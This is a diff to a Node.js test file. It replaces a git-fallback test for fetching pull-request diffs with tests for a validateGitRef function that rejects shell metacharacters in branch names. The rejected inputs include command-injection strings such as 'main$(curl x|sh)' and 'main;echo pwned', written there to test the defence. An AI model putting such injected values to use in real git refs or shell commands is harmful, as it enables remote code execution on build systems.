@@ -1,6 +1,6 @@
 import { describe, it } from "node:test";
 import assert from "node:assert/strict";
-import { fetchPRDiff, escapeHashReferences } from "./platform.js";
+import { validateGitRef, escapeHashReferences } from "./platform.js";
 
 describe("escapeHashReferences", () => {
   it("escapes #N after space", () => {
@@ -81,28 +81,26 @@ describe("escapeHashReferences", () => {
   });
 });
 
-describe("fetchPRDiff git fallback", () => {
-  it("returns via git fallback when API methods unavailable", () => {
-    // Simulate self-hosted runner: no gh CLI, no GitHub token.
-    const prevGh = process.env.GITHUB_TOKEN;
-    const prevMRGh = process.env.MULTI_REVIEW_GITHUB_TOKEN;
-    delete process.env.GITHUB_TOKEN;
-    delete process.env.MULTI_REVIEW_GITHUB_TOKEN;
-    try {
-      // Should not throw — git fallback handles the missing API methods
-      const diff = fetchPRDiff("3760");
-      // If the current branch has diverged from origin/main, diff is non-empty;
-      // otherwise (e.g. on a clean main checkout) it may be empty. Both are valid.
-      assert.ok(typeof diff === "string", "git fallback should return a string");
-      if (diff.length > 0) {
-        assert.ok(
-          diff.startsWith("diff --git") || diff.includes("diff --git"),
-          `expected git diff output, got: ${diff.slice(0, 200)}`,
-        );
-      }
-    } finally {
-      if (prevGh !== undefined) process.env.GITHUB_TOKEN = prevGh;
-      if (prevMRGh !== undefined) process.env.MULTI_REVIEW_GITHUB_TOKEN = prevMRGh;
-    }
+describe("validateGitRef", () => {
+  it("accepts valid branch names", () => {
+    assert.equal(validateGitRef("main"), "main");
+    assert.equal(validateGitRef("feature/my-branch"), "feature/my-branch");
+    assert.equal(validateGitRef("release/v1.2.3"), "release/v1.2.3");
+    assert.equal(validateGitRef("fix_123"), "fix_123");
+  });
+  it("rejects branch names with shell metacharacters", () => {
+    assert.throws(() => validateGitRef("main$(curl x|sh)"), /Invalid git ref/);
+    assert.throws(() => validateGitRef("main;echo pwned"), /Invalid git ref/);
+    assert.throws(() => validateGitRef("main`id`"), /Invalid git ref/);
+    assert.throws(() => validateGitRef("main$(id)"), /Invalid git ref/);
+    assert.throws(() => validateGitRef("main|cat"), /Invalid git ref/);
+    assert.throws(() => validateGitRef("main&&echo"), /Invalid git ref/);
+    assert.throws(() => validateGitRef("$(echo hi)"), /Invalid git ref/);
+  });
+  it("rejects empty string", () => {
+    assert.throws(() => validateGitRef(""), /Invalid git ref/);
+  });
+  it("rejects names with spaces", () => {
+    assert.throws(() => validateGitRef("my branch"), /Invalid git ref/);
   });
 });
